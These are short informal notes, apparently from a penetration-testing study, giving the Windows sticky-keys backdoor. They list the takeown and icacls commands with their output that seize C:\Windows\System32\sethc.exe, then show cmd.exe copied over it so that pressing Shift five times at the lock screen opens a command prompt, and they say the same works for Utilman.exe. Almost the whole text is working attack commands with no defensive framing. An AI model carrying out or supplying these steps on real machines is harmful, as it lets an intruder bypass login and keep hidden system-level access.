pressing shift 5 times makes the sticky key windows pop up
which is a binary that executes it


first we need to take down the binary and replace with cmd.exe.
binary
:>C:\Windows\System32\sethc.exe
replc
:>cmd.exe

firstly take ownersheip of sethc.exe to be able to over write it


:\> takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
        1 file(s) copied.


Utilman
==
Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

when ease of access is clicked this binary is execute C:\Windows\System32\Utilman.exe

so same procedure with sethc.exe
